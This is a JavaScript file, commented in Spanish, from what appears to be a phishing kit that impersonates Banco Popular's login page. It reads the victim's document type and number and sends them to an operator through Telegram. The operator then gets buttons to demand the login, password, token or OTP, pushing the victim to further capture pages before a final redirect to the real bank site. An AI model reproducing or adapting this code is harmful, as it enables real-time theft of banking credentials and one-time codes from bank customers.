/**
 * POPULAR - script.js OPTIMIZADO
 * Página principal (index.html) con integración al sistema centralizado
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Popular Index: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        alert('Error: Sistema no inicializado correctamente');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const inputs = {
        tipoDocumento: document.getElementById('documento-tipo'),
        numeroDocumento: document.getElementById('documento-numero')
    };
    const btnContinuar = document.getElementById('btn-continuar');
    const overlay = document.getElementById('loading-screen');
    
    console.log('📋 Elementos:', { inputs, btnContinuar, overlay });

    BancoUtils.onTelegramAction(handleTelegramAction);

    // Validación de inputs
    inputs.numeroDocumento.addEventListener('input', () => {
        BancoUtils.validateNumeric(inputs.numeroDocumento, 15);
        validateForm();
    });

    function validateForm() {
        const isValid = inputs.numeroDocumento.value.length >= 6;
        btnContinuar.disabled = !isValid;
        if (isValid) {
            btnContinuar.classList.add('enabled');
        } else {
            btnContinuar.classList.remove('enabled');
        }
    }

    validateForm();

    btnContinuar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinuar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        // Mostrar overlay directamente
        if (overlay) {
            overlay.classList.remove('hidden');
            overlay.classList.add('show');
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = {
            tipoDocumento: inputs.tipoDocumento.options[inputs.tipoDocumento.selectedIndex].text,
            numeroDocumento: inputs.numeroDocumento.value
        };

        BancoUtils.saveBankData('popular', data);
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('BANCO POPULAR - LOGIN', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '🔑 Pedir Clave', action: 'request_clave' },
            { text: '📱 Pedir Token', action: 'request_token' },
            { text: '🔢 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('login', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.classList.add('hidden');
                overlay.classList.remove('show');
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Popular Index:', data);
        if (overlay) {
            overlay.classList.add('hidden');
            overlay.classList.remove('show');
        }
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Limpiando campos de login');
                inputs.tipoDocumento.selectedIndex = 0;
                inputs.numeroDocumento.value = '';
                btnContinuar.disabled = true;
                btnContinuar.classList.remove('enabled');
                break;
            case 'request_clave':
                console.log('🔑 Redirigiendo a clave.html');
                window.location.href = 'clave.html';
                break;
            case 'request_token':
                console.log('📱 Redirigiendo a token.html');
                window.location.href = 'token.html';
                break;
            case 'request_otp':
                console.log('🔢 Redirigiendo a otp.html');
                window.location.href = 'otp.html';
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a bancopopular.com.co');
                window.location.href = 'https://www.bancopopular.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
